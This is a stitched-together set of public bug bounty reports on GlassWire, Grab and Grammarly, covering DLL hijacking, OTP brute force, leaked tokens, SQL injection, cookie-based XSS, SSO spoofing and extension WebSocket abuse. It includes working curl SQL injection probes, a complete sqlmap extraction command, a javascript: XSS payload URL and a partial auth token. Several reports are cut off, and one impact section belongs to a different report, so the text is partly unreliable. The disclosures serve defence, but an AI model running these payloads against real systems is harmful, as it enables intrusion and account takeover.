The vulnerability exists due to GlassWire loading DLL files from the PATH environment variable without verification. The machine should have at least one writable PATH directory for the privilege escalation to work (e.g. having Python, Java, etc. installed).
Nine different DLL's are loaded by the GlassWire Service (GWCtlSrv.exe) as SYSTEM.
One DLL is loaded by the GUI (GlassWire.exe) as the currently logged in user.
Class: Privilege Escalation [CAPEC-233]
Class: Uncontrolled Search Path Element [CWE-427]
Affected Product
GlassWire 2.2.210.0
Proof of Concept
Usually, Python is prepended to the PATH environment (Path=C:\Python38\Scripts\;C:\Python38\;..). For my ease and workflow, I prepended my folder to it (C:\Dima\;). Place the x86 DLL in one of the writable folder paths.
C:\Program Files (x86)\GlassWire\GWCtlSrv.exe
GlassWire (32bit) loads the following DLLs during boot as SYSTEM:

Impact
Successful exploitation of the GlassWire service allows an attacker to gain SYSTEM privileges and inject into the GlassWire service process at boot.
Successful exploitation of the GlassWire GUI allows a user to gain persistence.

I found a OTP code bypass on the login endpoint, used by Grab Android App. Since no password was required upon login (only SMS code), it was actually account takeover (still, the victim will be informed that something is wrong  because of few incoming SMSes with codes).
The team was very responsible and fixed the issue fast.
Thanks to the Grab team for the great experience and the bounty! It is a pleasure to work with you!
Technique
The used method (thanks to the @yaworsk and his #149598 report!) is highly depending on the luck due to low enough chance to guess correct code using only 3 attempts in 30 seconds (and we must consider that the server may not throw the one of the choosen codes for a very long time). So account takeover is not so easy, and requires a lot of time. The side effect of this - it is abusing the SMS sending mechanism (it was fixed too).
Why it works
1) The code had only 4 digits (with 5-6 digits chance to guess the code dramatically drop). Even with 4 digits tool can work a week without results.
and
2) There was no limiting on the code refreshing attempts  (now it is, and also account can be locked).
Used tools and apps:
1) Nox App Player (android emulator), proxied through web debugging proxy.
2) Tested application - https://play.google.com/store/apps/details?id=com.grabtaxi.passenger (app allows registration from any country)

I looked to it, and wrote a simple C# tool which sends all possible codes combinations, until it finds a correct code. Source code and POC tool included to the report (it requires at least Windows 7 and NET 4.0 to run).
Impact
The attacker can bypass 2FA authentication on Grab android app. Attacker can succeed in the account takeover, changing email, phone number of the victim who use Google Auth on the app etc.
Steps To Reproduce:

Login to your Grab Android app using Google with valid phone number (2FA on the phone login option is correctly implemented, and not vulnerable).
Edit your profile name and press Save.
The 4-digit sms code will be send to your phone. Dont look to it now:)
Use my POC tool (written on C#, requires .NET 4.0). You need a one header from the any app web request (x-mts-ssid) for proper testing. You can extract it from the any request from Android app, using some Web Proxy.
If you have troubles with extracting x-mts-ssid session header from the web request - let me know. It can be tricky thing (i used android emulator, connected to Charles Web Proxy, for request monitoring).
Open the program, paste the x-mts-ssid in the text field and press ""Start"". Wait till process will ends (correct code will be found).
Compare code from the tool, and code that you received on the phone earlier - they must be equal. Also i wrote a POC video (https://drive.google.com/file/d/0B8dmpoHKDZsZSFI5WXY2RzRYT00/view?usp=sharing).

Mitigation/Remediation Steps:
I suggest you implement a rate-limiting on this endpoint, or force 2FA code expiring after, for example, 5 wrong attempts (or both of this for better security).1 attachment:F156385: tool.zipSummary by sp1d3rsI found a two-factor authentication bypass on the endpoint, used by Grab Android App.
The team was very responsible and fixed the issue fast.
Thanks to the Grab team for the great experience and the bounty!
I escalated similar issue to the any user account takeover by unauthenticated attacker in #205000 report (disclosure will be requested after clearing the private info). In this report i mentioned, that ""Login with mobile number"" endpoint is secure, and not vulnerable, but later i challenged myself, and discovered a way to bypass OTP code (not 2FA like in this report) there too.
I will disclose #205000 as soon as sensitive info there will be redacted.
P.S. the POC tool did not check the codes, which was starting from 0*** (my bad) - fortunately, it did not affect triage process. The attached tool also can be rewritten for the any other case. Yeah, it's probably the time to learn Python:)

Hello. Today i discovered, that Search Engines can access the private users messages (OTP pins, Group invites information etc.)
It happens because the https://grab-attention.grabtaxi.com host allows search indexing, and can leak the auth_token to the Search Engines which also can lead to privilege escalation.
When vieving ""Notifications"" section on the app, i noticed the unsecure GET request to the https://grab-attention.grabtaxi.com/passenger/passenger.html?auth_token=[my_token]&view=268435456. I was surprised, when tried to repeat it in the browser - it gave me access to my messages.

Steps To Reproduce:

Cheking the private messages of other user (me):
https://grab-attention.grabtaxi.com/passenger/passenger.html?auth_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJQQVNTRU5HRVIiLCJleHAiOjQ2NDUyMzk1NDUsImlhdCI6MTQ5MTYzOTU0NSwianRpIjoiZWI0YmFiMjUtYzA2Yi00MGIzLWJiZTctMzZkYzFmMWRkZTMyIiwibG1lIjoiU1lTVEVNIiwibmFtZSI6IiIsInN1YiI6IjM2NWE0NjY0LTY1MGEtNDBjZC05YWU2LTQ4YWQwN2Q2NGY2OSJ9.eTX2dWnooTxm50Dv1VYoIZanOqCe073_AmVk97VE4p7m4e26mcWtnZzQz5IR1EwuWbs52qJLzzAIZ5KcpWoKCvadu6zuRQzy2xRk8BcFDUXGl8w8doPJbuSIHMY0K-x8Q-█████████ZTdgxLI&view=268435456#/
Checking that search engines can crawl it:
Use this Google DORK (search text):
passenger site:grab-attention.grabtaxi.com
and press Search.
You will see this cached page with auth_token (actually it was cutted due to big query length) - but it is still a huge information disclosure.

Suggested fix

Disable Search indexing on https://grab-attention.grabtaxi.com
For the better security you can change the request method to the https://grab-attention.grabtaxi.com/passenger/passenger.html endpoint from GET to POST (or encrypt it) due to that fact that auth_token are leaked in the query parameters.

We have reviewed your bug report and would like to inform you that your submission is valid. It is important to note that on investigating this issue, we found that search engine cannot crawl and index Grab-attention website from Grab application this may explain why your google dock have only one result (account from another researcher). In this context, privilege escalation looks very difficult. However, like you said we should disable search indexing and change the request method.

Grab,10001,0.0,200m-1b,$250.00,Medium,5.45,Improper Access Control - Generic,Unrestricted access to Eureka server on ██████,"reptou  submitted a report to Grab.Jan 12th (5 years ago)Hi Grab Security Team, 
First of all, best wishes for 2018, empty of bugs if possible ;-) 
Summary: I found that the following endpoint is hosting Netflix Eureka Server █████ and that even if some URLs are requiring authentication (401 code for some of thems like /metrics for example), it is still possible to send requests to the REST API. 
Description: I think that this is a test infrastructure, however the dashboard some applications registered on Netflix Eureka server (please see screenshot attached ""███"") which targets private EC2 instance (nothing published on the Internet) are visible. 
Digging a little bit shows that Netflix provides a REST API described here :
Code 61 BytesWrap lines Copy Download1https://github.com/Netflix/eureka/wiki/Eureka-REST-operations
I tried some requests and it seems that it does not require any kind of authentication. I prefer to do some tests that could not lead to any disruption (even if this seems to be a test infrastructure), but for example the following request returns 200 :
Code 337 BytesWrap lines Copy Download1PUT ████████HTTP/1.1

5Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3

5Connection: close
6Server: Tengine/2.2.1
Following the description of the REST API, I think that an attacker could modify any propertie regarding the current instances registered or even register a new one with his own settings. As I am not sure if there is some production behind, I choose to report it directly without doing any modification on the current systems.

From my perspective, this could help an attacker registers his custom AWS EC2 instance into an application and make it part of the service load balancing provided by Eureka.nozz_   changed the status to Triaged. Jan 12th (5 years ago)Hi Reptou,

Following my previous research, it seems that your Microservices architecture you are currently running on *.█████myteksi.net is publicly exposed on another endpoint : https://█████████.█████myteksi.net. 
Summary: 
When researching and starting a new enumeration of your different subdomains, I found that https://███.████████myteksi.net is related to your Eureka / Zuul environment and is reachable without any filtering. 
Description:
This is a quite complex architecture, but I think that it reveals a lot of debug information that could help an attack find a vector, and certainly enables him to do some actions on this infrastructure without any control (this has to be confirmed as I do not want to perform any modification on your curent environment). 
In order to understand the way this infrastructure works, I read the following documentation to discover some endpoints and see what could be achieved : http://cloud.spring.io/spring-cloud-static/Finchley.M5/single/spring-cloud.html#_health_indicator_2
Regarding information gathering, there are different endpoints reachable for example :

https://█████.███████myteksi.net/info
https://████.██████myteksi.net/dump
https://███████.█████████myteksi.net/trace
https://████████.██████████myteksi.net/configprops
https://████████.███myteksi.net/env (from this one you got the eureka username and I guess the password too even if this is hidden ;-))
https://█████.████myteksi.net/beans
https://█████.█████myteksi.net/metrics
https://███.████myteksi.net/autoconfig
https://███.█████████myteksi.net/routes
https://██████████.█████████myteksi.net/features

For the action to be done, we may notice the following (extract from the documentation) :
Code 456 BytesWrap lines Copy Download1For a Spring Boot Actuator application there are some additional management endpoints:
2
3* POST to /env to update the Environment and rebind @ConfigurationProperties and log levels
4* /refresh for re-loading the boot strap context and refreshing the @RefreshScope beans
5* /restart for closing the ApplicationContext and restarting it (disabled by default)
6* /pause and /resume for calling the Lifecycle methods (stop() and start() on the ApplicationContext) 
As stated previously, I did not try these actions, but I have a good confidence that it will be executed without any restriction. 
From my point of view, this is an internal infrastructure that should not be exposed to any Internet user (as for the eureka endpoint previously reported).

This is quite difficult to know exactly what could be achieved as the infrastructure is complex. However, I would say that it could first enable an attacker to understand better your infrastructure and identify weaknesses. The other point is that if the attacker is able to perform some actions, this could lead to DoS of this service in some cases and, of course, unexpected behaviour (modfying env properties ...)prakhar-prasad   changed the status to Triaged. Jan 13th (5 years ago)Hey @reptou,

Grab,10001,0.0,200m-1b,"$6,500.00",Critical,9.5,Information Disclosure,Leaking sensitive information on Github lead full access to all Grab Slack channels ,"xsam  submitted a report to Grab.Aug 21st (4 years ago)Summary:
 Accidental leakage of secret keys in such code repositories is a real problem, after my report #387117, I decided to dig deeper than the previous report and looking to some random profiles in Github, and doing some dirty work I was able to access to the developer’s company’s internal chats and files on Slack. And not only that, there’s no easy way to see if someone is eavesdropping on the communication. In the worst case scenario, these chats can leak production database credentials, source code, files with passwords and highly sensitive information.
Description:
████ is QA Automation Engineer at Grab according to his LinkedIn profile, after doing some manual search in Github. I found his Github profile which contains weird repo
https://github.com/████/
{F335908}
I was about to close that tab since there is no useful file but wait second, did you notice 30 releases?
Multiple versions for multiple OS systems, I decided to download the zip file, after the unzipping I started ███ which is an Electron application.
{F335910}
I thought it was a dead-end but I noticed the bar so I clicked Environment then Toggle Developer tools in order to know the origin of that app go to Source as attached in the screenshot below 
Image F335916: Capture_d_e_cran_2018-08-21_a__05.19.51.png 310.76 KiBZoom in Zoom out Copy Download
Know it is the time for some thinking outside of the box and be creative. As I don't have much experience with Electron apps so after some googling I found that it is possible to reverse-engineer an existing Electron app by following those steps :


Open terminal and install asar node module globally by typing npm install -g asar


Go to ████ file directory, in my case
cd /Users/mac/Downloads/██████/Contents/Resources


Create a directory to paste the content of app for example mkdir ███████-sourcecode


Unpack the app.asar file in the above directory using asar asar extract app.asar example-sourcecode


{F335918}
Now we have all available endpoints in the app or let say in gamma.grab.com as well if you go to
build/constants/google/ you will get client_secret.json
Code 421 BytesWrap lines Copy Download1{
2    ""installed"": {
3        ""client_id"": ""█████"",
4        ""project_id"": ""███████"",
5        ""auth_uri"": ""https://accounts.google.com/o/oauth2/auth"",
6        ""token_uri"": ""https://accounts.google.com/o/oauth2/token"",
7        ""auth_provider_x509_cert_url"": ""https://www.googleapis.com/oauth2/v1/certs"",
8        ""client_secret"": ""█████████"",
9        ""redirect_uris"": [""urn:ietf:wg:oauth:2.0:oob"", ""http://localhost""]
10    }
11}
and google_token.json
Code 98 BytesWrap lines Copy Download1{""access_token"":""██████████"",""refresh_token"":""████"",""token_type"":""Bearer"",""expiry_date"":█████████}
But the most usefull and impactfull files are on build/environement:

production-ph.env.json
production.env.json
staging.env.json

to verify if those token work let take for example 
Code 138 BytesWrap lines Copy Download1""slack"": {
2    ""channel"": ""█████"",
3    ""schedule_channel"": ""███████"",
4    ""token"":
5      ""xoxp-██████"",
6    ""user"": ""█████ ██████████""
7  }
Before doing we need to know what kind of token is on our hand since Slack have multiple kinds of token
Image F335920: Capture_d_e_cran_2018-08-21_a__05.49.51.png 187.87 KiBZoom in Zoom out Copy Download
Image F335921: Capture_d_e_cran_2018-08-21_a__05.51.29.png 185.40 KiBZoom in Zoom out Copy Download
So we have User tokens The xoxp-token (prefix xoxp) can be generated from the OAuth Test Token-page. This token is exactly like having the complete username and password for the user. Even for a user with two-factor authentication enabled, you can still access Slack with nothing else but this token.
And it is time to test if that token work or not? in order to that we need to follow the API documentation provided by slack here https://api.slack.com/web and try a non-sensitive method since I don't have the permission to read your internal data 
Image F335923: Capture_d_e_cran_2018-08-21_a__05.55.10.png 164.72 KiBZoom in Zoom out Copy Download 
The best example will be to list the name of all channels
Image F335924: Capture_d_e_cran_2018-08-21_a__05.57.41.png 175.46 KiBZoom in Zoom out Copy Download
So I set GET request in Burp with adding Authorization: Bearer xoxp-████as header and the result 
{F335925}
The result is 100 channels including but not limited to :

How to protect? (Important)


Avoid git add: commands: Using wildcards can easily capture local files not truly intended to be shared, Instead of wildcards, name each file you commit, or use git add -p to review each change you add.


Name sensitive files in .gitignore & .npmignore: git support a local file listing exclusions from packaging and commits, which you can use as a safety measure against the accidental inclusion of sensitive files, and you can use GitHub’s sample .gitignore files for other inspiration.


git-secrets: git hook prevents committing in credentials: a useful tool called git-secrets. The tool hooks onto git commit and breaks the commit if it includes patterns that appear to be credential. This is a good content-focused safety net, complementing the previously suggested filename based protection.


Encrypt or use environment vars when publishing from CI.


Invalidate leaked credentials.

Grab,10001,0.0,200m-1b,"$4,500.00",High,7.95,SQL Injection,www.drivegrab.com SQL injection,"jouko  submitted a report to Grab.Oct 3rd (5 years ago)Summary:
The website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code.
Description:
The plugin allows the site admin to create forms to be filled by users. For this end it implements some AJAX functions, including one to preview (or actually just view) a form. The functionality is probably intended for administrators to be used in the form design phase, but for some reason it is accessible to unauthenticated users.
The preview function accepts some parameters. Some of them allows the user to specify HTML and WordPress shortcodes (special WordPress markup) to be included with the preview. One of the shortcodes implemented by the Formidable Pro plugin contains an SQL injection vulnerability.
Browsers Verified In:
N/A
Steps To Reproduce:
Verifying the AJAX preview function with the cURL tool:
Code 96 BytesWrap lines Copy Download1curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'
This request shows a preset ""contact us"" form (if form id is not defined, you'll get the first form in the database).
The preview AJAX request accepts some parameters. For example you can define HTML to be shown after the form:
Code 119 BytesWrap lines Copy Download1curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=hello world'
You see that ""hello world"" appears on the page after the ""Contact us"" form.
The HTML may contain WordPress shortcodes which are special markup in square brackets. There are shortcodes implemented by the WordPress core, and shortcodes implemented by plugins. Any of these can be included in the form preview.
The Formidable plugin implements several shortcodes. One of them is [display-frm-data] which displays data that people have entered in a form. It accepts a few parameters, e.g. the form id:
Code 139 BytesWrap lines Copy Download1curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835]YYY'
In the resulting HTML you see some form entries between ""XXX"" and ""YYY"".
The [display-frm-data] shortcode also accepts parameters ""order_by"" and ""order"" for sorting the entries. The ""order_by"" parameter can contain a field ID or list of them. The ""order"" parameter is supposed to contain ""ASC"" or ""DESC"" to indicate the sorting direction. These parameters can be used to carry out an SQL injection.
Example:
Code 169 BytesWrap lines Copy Download1curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY'
Although this example gives no meaningful output, you should see in the server logs that the ""zzz"" went in an SQL query which produced an error message.
The shortcode parameters are processed in various ways which makes it very complicated to perform a successful SQL query and retrieve data. However it is possible.
The injected code goes in the ORDER BY clause of an intermediate query that retrieves the list of form entry ID's. Results of the manipulated query aren't directly visible. The attacker can control the order of entries appearing on the page, which is enough to communicate one bit of data from the database.
A further complication is that any comma symbols in the injected data are specially treated and affect the resulting SQL query in a way that creates errors. With careful formatting, however, the query can be salvaged.
I came up with the following sqlmap options to retrieve any data from the database:
Code 456 BytesWrap lines Copy Download1./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order=""%2a( true=true )""]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace("","","",-it.id%2b"");order_by=""id,""*true.count("","")+""id""'  --test-filter DUAL --tamper commalesslimit -D █████ --sql-query ""SELECT ██████████ FROM █████ WHERE id=2""
This works with the latest sqlmap. The ""commalesslimit"" tamper module helps avoiding comma symbols in any LIMIT clauses. The --eval parameter does some processing to repair queries that contain commas in the SELECT clause.
Specifically, for each comma appearing in the order parameter, the plugin appends "",it.id"" in the query. The repair code appends ""-it.id+"" after each comma to neutralize the effect. In other words, an injected ""SELECT a,b"" query would be translated to ""SELECT a,it.id b"" by the shortcode logic. The repair code changes it to ""SELECT a, it.id-it.id+b"" which evaluates to the original injected query.
Result of the above sqlmap command:

Impact
Impact:
Cyber attackers can launch a phishing campaign leveraging your established (soon to be impacted) brand reputation.
The victim has no way of telling, whether the content is served by the domain owner or the cyber attacker.
Attackers can also chain higher severity attacks to this. Many applications expose session cookies to a wildcard domain (*.example.com),
so any subdomain can access them. An attacker can take a forgotten subdomain, trick the user to visit it, and extract cookies
(even those with secure flag). This can be seen as an advanced version of XSS.prakhar-prasad   changed the status to Triaged. May 16th (5 years ago)We have reviewed your bug report and would like to inform you that your submission is valid.

Thanks for releasing it.
This issue doesn't significantly risk our users or their data - XSS [requires important cookies to be scoped in *.grab.com] and convincing phishing attack [requires a bit of social engineering combined with user interaction]. Hence, the Medium severity classification.

Grammarly,501-1000,0.0,10m-50m,"$2,000.00",High,8.2,Cross-site Scripting (XSS) - Stored,Account takeover through the combination of cookie manipulation and XSS,"k4r4koyun  submitted a report to Grammarly.Apr 10th (4 years ago)Summary: A cookie based XSS on www.grammarly.com exists due to reflection of a cookie called gnar_containerId in DOM without any sanitization. Normally, gnar_containerId is being set by the server however a vulnerable endpoint at gnar.grammarly.com called ""/cookies"" allows us to manipulate cookies set for *.grammarly.com and gnar_containerId was one of them. Through the combination of these findings, we were able to bypass ""CORS protection/HttpOnly cookie flag"" and steal any Grammarly users cookie that visits a webpage that has our malicious javacript code.
Description: An endpoint at gnar.grammarly.com called ""/cookies"" allows us to set or get any cookie value we want. Sending a POST request sets the cookie value whereas sending a GET cookie returns the value of an existing cookie. In a normal scenario, an attacker could send a GET request to that enpoint and read user authentication cookie (grauth in this case)But due to the same origin policy, we were not able to read the response . Sending a POST request was still viable(as we did not have to read the response) and we were able to replace session cookies of users (who had browsed any webpage that contained our malicious javascript) and force them to use our session. This allowed us to see any document that was created after the point of exploitation.
This was our initial bug bounty report (#532553) however, HackerOne staff did not approve it and said this is how cookies are supposed to work. So we decided to investigate this case further.
Then we have found that Grammarly uses multiple cookies and one of them is called ""gnar_containerId"". We have discovered that this cookie gets reflected on the ""www.grammarly.com"" in src attribute of an img tag. The value inside the img tag is encoded and not exploitable. However there is another img tag, surrounded with noscript tags. The second value that is inside of the noscript tags was not encoded and prone to XSS. Combining the XSS vulnerability found in the www.grammarly.com domain and the cookie manipulation through gnar.grammarly.com/cookies allowed us to inject a gnar_containerId cookie that holds our malicious javascript code
Our malicious payload that was injected into the context of grammarly.com will make a get request to gnar.grammarly.com/cookies to retrieve the values of the session cookies of the currently logged in user and send it  back to our server. Normally, an ordinary XSS would not lead to such cases as grammarly cookies are set to be httponly and secure, so it is not possible to manipulate cookies through DOM. But Thanks to the endpoint that we have discovered initially, we were able to retrieve/replace any cookies that was set by *.grammarly.com. We were able to bypass the CORS as our requests were sent on behalf of the grammarly.com and read the response.
To put it simply, if a user visits a webpage that we control, it will steal the cookies and send them to us. Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar_containerid with the second stage of our payload and the redirect the user to the vulnerable page. Upon this, our injected payload will get triggered and will make another request to gnar.grammarly.com/cookies on behalf of the grammarly.com, then will send the response body to a server that we control.
For the purpose of illustration, we just stole grauth cookie of a test account but we could actually steal any cookie set by grammarly.com.
Solution: This attack scenario was made possible because of the following:

gnar.grammarly.com/cookies does not check Referer information when it receives POST request. Adding a Referer check (assuming that no website other than the ones that hosted at *.grammarly.com is using that endpoint) will prevent client-side requests from 3rd parties.
There is no whitelist/blacklist for cookies that a client can alter. Disallowing the alteration of grauth and csrf-token cookies should be implemented.
Content based encoding was applied for noscript tags however with the combination of unnecessary trust to the cookies, an XSS was possible. Encoding should be applied for noscript tags too.

Account takeover via cookie stealing

Grammarly,501-1000,0.0,10m-50m,"$10,500.00",High,7.95,Improper Authentication - Generic,Ability to DOS any organization's SSO and open up the door to account takeovers,"cache-money  submitted a report to Grammarly.Sep 8th (2 years ago)Summary:
There's an interesting issue I've spent quite a few days trying to escalate but can't figure out. The impact at this point is that I can DOS any SSO integration making it so nobody in that organization can login. I can also get users to inadvertently SSO into my attacker organization, and then take over their account from there. For existing accounts this would require a victim to click ""join"", however I think that's likely given the fact that they are SSOing for the first time expecting to join an organization.
The strange behavior and why I think it might be possible to escalate further, is that I can have you authenticate against one SSO instance, but have you get added to a completely separate one. So that means there is some sketchy logic which can potentially allow an attacker to authenticate against their own SSO instance, and get added to someone else's organization. I'm not sure if it's possible to get this with zero user interaction, but I will keep trying and update the report if I figure out a way.
The bug stems from the fact that you can create an entityId identical to that of another organization except with a space   at the end. The application logic then prioritizes that new entityId to add the user to after authenticating against the correct one. So if you have myentity as the legitimate entity, and an attacker sets their entity to myentity[SPACE] (with a space at the end); users attempting to authenticate into the legitimate myentity will technically authenticate against it, but then the application attempts to log them into the attacker's organization. The result of this is a DOS since legitimate users can no longer access their organization. The interesting part of the bug is that if the user is deleted from their original organization (or a new user attempts to SSO), they will then be authenticating against their original organization, but get added into the attacker's organization. So it seems the SAML Response is checked against a trim(issuer), but when trying to place the user into an organization, the entity with the space is always prioritized.
The steps below will demonstrate this behavior:
Steps To Reproduce:

Setup SSO and confirm you can login.
Create a new Grammarly business account and use the same entityId (Identity Provider Issuer) you used in step 1, except add a space to the end of it. Use a different keypair for this organization as well.
Wait 2 minutes for the change to propagate, then try logging into the same account from step 1, and notice you now get an error.
At this point the victim organization is DOS'd. To confirm the strange behavior discussed above, you can delete that user from the victim organization and attempt to login again. Notice you will now end up getting provisioned to the attacker's organization, even though you signed the SAML Response with the victim organization's private key.
Once you are provisioned into the attacker's organization, the attacker can then change their entityId to something brand new, and login to the victim's account using the keypair they own. If this was a converted personal account, you can then access that user's personal documents.

Impact

Ability to effectively disable SSO for any organization.
Ability to get users provisioned into an attacker's account, which they can then takeover.

Grammarly,501-1000,0.0,10m-50m,"$1,500.00",High,7.95,None,`socket` command allows sending data over WebSockets to arbitrary origins from Grammarly Extension,"metnew  submitted a report to Grammarly.Aug 16th (4 years ago)Summary

Attacker could trigger Grammarly extension's socket command using a crafted page to perform WS connection(and data sending) from extension's background page (with cookies and origin) to any URL.
Additionally, commands received from the attacker's server are handled by extension and could be used to trigger wrong business-logic behavior (misleading commands) or possibly(!) RCE.

Websockets 101 (important for understanding)

Websockets differs from XHRs - As opposite to XHR, CORS doesn't apply to WS.


Page could initiate WS connection to any cross-origin resource.
There is no browser-level mechanism to prevent WS connection from one origin to another. (like CORS for XHR)
Connection through wss:// includes all user's cookies.

WS server is responsible for validating Origin header to check is connection trusted.
Example

evil.com sends XHR to good.com = CORS rejects requests (assuming no Access-Control-Allow-Origin was specified in response)
evil.com  connects to ws://good.com using WS = server at good.com is responsible for Origin header validation.

Attack mechanism
[Page] -> (socket action) -> [Content script] -> (socket action) -> [Background page] -> [WS server]
Summary [1/3]
Page could exploit ""socket"" command to :

connect to arbitrary WS endpoint from Grammarly extension origin
send arbitrary data from Grammarly extension origin to any WS endpoints

w.emit(""message"", t) [received command vs background page]
You probably noticed this line in t.onmessage handler.
Shortly, background page handles events received from remote WS server.
Grammarly uses wss://capi.grammarly.com/freews endpoint for text processing.

I guess ""capi"" is an abbreviature for Command API.

As of extension could connect to any WS endpoint, it will handle commands received from attacker's endpoint too.
I don't show the full call stack, however, w.emit(""message"", commandFromServer) is handled in this snippet:
Code 944 BytesWrap lines Copy Download1this._onBackgroundSocketEmit = function(e, t, n) { // <-- e = command from attacker's server
2                var o = e.event

4                  , a = e.msg;
5                if (p.trace(""from ws "" + o + "" "" + i, {
6                    msg: a,
7                    messageType: t
8                }),
9                a && a.error && ""not_authorized"" === a.error)
10                    return m._tryToFixSession();
11                var c = setTimeout(function() {
12                    var e = m._sockets[i];
13                    e && (e.release(),
14                    e.overrideEmitToNoOp(),
15                    delete m._sockets[i])
16                }, m._releaseTimeout);
17                m._message.emitTo(n, t, r({}, e, { // <-- send command from server to content script
18                    id: s.guid()
19                }), function(e) {
20                    return e && clearTimeout(c)
21                })
22            }
Shortly, emitTo emits the command (from attacker's server) from background page to content script.
Summary [2/3]
Background page:

Connects to attacker's WS endpoint 
Receives a command from the WS endpoint
Handles received command
Sends received command to the content script

#394518
First of all, #394518 is about user data.
It's possible to get the latest available socketId property and send random malformed data to capi.grammarly.com under current socketId. However, I think it has zero impact :(
received command vs content script
Received commands handled in next function:
Code 532 BytesWrap lines Copy Download1this._onMessage = function(e, t) {
2                var r = n._sockets[e.socketId]; // <-- e.socketId from previous ""connect"" command

4                    var i = e.msg || {}; // <-- e.msg - msg received from attacker's server 
5                    i.action && ""error"" === i.action.toLowerCase() && n._telemetry.soketCsErrorMsg(i),
6                    t(""ok""),
7                    r.emit(e.event, e.msg) <--- emit ""message"" event in content script with attacker-supplied command
8                }
9            }
r.emit(e.event, e.msg)
I was able to call r.emit(e.event, e.msg) from the snippet above a few times [No PoC, however, It was documented during research].
However, after analyzing listeners of this emit (and ancestor calls) I realized the API is too high-level and It can't lead to script execution in the content script.

Impact
""connect"" + ""send"" to any origin
Attacker could connect and send data to any WS endpoint from extension origin.
It's not as impactful as #389108 by itself, because of WS policies.
""connect"" + ""send"" to Grammarly's endpoints
As of Grammarly's WS APIs allows connections from Grammarly extension origin, attacker could send arbitrary data with user's credentials to:

wss://dox.grammarly.com/
wss://capi.grammarly.com/
And other Grammarly WS endpoints (and Grammarly extension origin ""friendly"" endpoints, if any)

Example of impactful WS connection: wss://dox.grammarly.com/documents/<document_id>/ws - allows editing document with <document_id>
Response handling
As a bonus, it's possible to connect to attacker's WS endpoint, receive data and handle received commands in background page and content script. No PoC or possible exploitation, however, that's potentially a bad behavior.

I hope Grammarly team could imagine the effort I put into this research :(
Set ""High"" impact, because of arbitrary WS connection + handling of commands received from attacker's server.

Grammarly,501-1000,0.0,10m-50m,"$3,000.00",Medium,6.4,Business Logic Errors,Config override using non-validated query parameter allows at least reflected XSS by injecting configuration into state,"fransrosen  submitted a report to Grammarly.Jan 21st (2 years ago)Hi,
First, I just want to say after spending a few days on your assets that I'm really impressed by the high security standard of the apps exposed. It has not been easy to find issues. I really like the way you've structured your API-routes in a way that almost eliminates a bunch of access issues.
I did find an interesting path that resulted in some issues. I did not classify the issue below just as an XSS, since you can also change business logic depending on what parameters you are affecting. I used the XSS as an example of what you can do with this.
The issue is that the code on app.grammarly.com allows a ?config=-parameter to be used:
Code 866 BytesWrap lines Copy Download1              , s = function(e, t) {
2                const n = u.Monitoring.Logging.getLogger(""config.parser"");
3                return Object(i.pipe)(t, c.h.chain(e=>Object(i.pipe)(c.b.tryCatchError(()=>JSON.parse(e)), c.b.mapLeft(n.handler(""Parse error of the provided JSON config"", {
4                    config: e
5                }).info), c.h.fromEither)), c.h.fold(()=>e, t=>Object(i.pipe)(ye.decode(t), c.b.mapLeft(ge.failure), c.b.mapLeft(e=>n.info(""Validation error of the provided JSON config"", {
6                    config: t,
7                    error: e
8                })), c.b.fold(()=>e, t=>{
9                    n.info(""Load app with custom config"", t);
10                    const r = c.k.asks(()=>e);
11                    return c.k.createFrom(r)(()=>t)(void 0)
12                }
13                ))))
14            }(Object(d.b)(), a.query.get(""config""))
As you see here, the query.get(""config"") passes through a chain, first JSON-parsing it, and then validating it against a TypeScript-schema. This is a great solution to prevent some issues, since the TypeScript contains a list of config parameters and their corresponding type:

The HttpString type is validating that the value is a string and begins with ^https?|wss?. It does allow any URL you want, but since you have a limited list of connect-src in your Content-Security-Policy, unless there's another issue with one of the hosts in there, there's no data getting sent externally by overwriting these values.
However.
There are missing properties in the TypeScript-schema, which are still being used live. Looking at the api-property, the current config being used live contains the following ones as well:
Code 726 BytesWrap lines Copy Download1""institutionSuggestionsUrl"": ""https://institution.grammarly.com/api/institution/settings/suggestions"",
2""institutionTonesUrl"": ""https://institution.grammarly.com/api/institution/settings/tones"",

9""tonesUrl"": ""https://institution.ppgr.io/api/tones"",
Since these ones are not in the TypeScript-schema, and the schema is set as Partial<{}>, you can overwrite the additional parameters with whatever content you want. 
The interesting one I found for my PoC was the api.redirect. It's being used for navigating between sites, especially when you are linking to upgrading your plan:
Image F1165873: Screenshot_2021-01-21_at_01.29.18.png 45.27 KiBZoom in Zoom out Copy Download
Another one when being upgraded, is the account-property which is completely missing from the TypeScript-schema. The Subscription-link in the menu of the editor uses account.subscription-property which is never validated either:
Image F1165874: Screenshot_2021-01-21_at_01.28.28.png 69.56 KiBZoom in Zoom out Copy Download
Also, another thing being interesting is, if you use the https://app.grammarly.com/docs/new, the current URL is rewritten when the new document is created, but the config from our query parameter will still be injected properly, this makes it possible to hide the injection.
PoC
The following PoC will work for both upgraded accounts and free users. Free users will get the payload triggered when they try upgrading to Premium from the editor:
Image F1165875: Screenshot_2021-01-21_at_01.32.01.png 448.02 KiBZoom in Zoom out Copy Download
And paying users will get the payload trigger when clicking ""Subscription"" in the menu:

Since the config is persistent during the session, going to the main page as a free user and clicking the upgrade to premium will also get it triggered, but you can link to the start page also with the config (this won't hide the payload however):
Code 104 BytesWrap lines Copy Download1https://app.grammarly.com/?config={%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}

You can also modify the crossPlatformOfficeAddin.infoURL since it's also not a part of the schema:
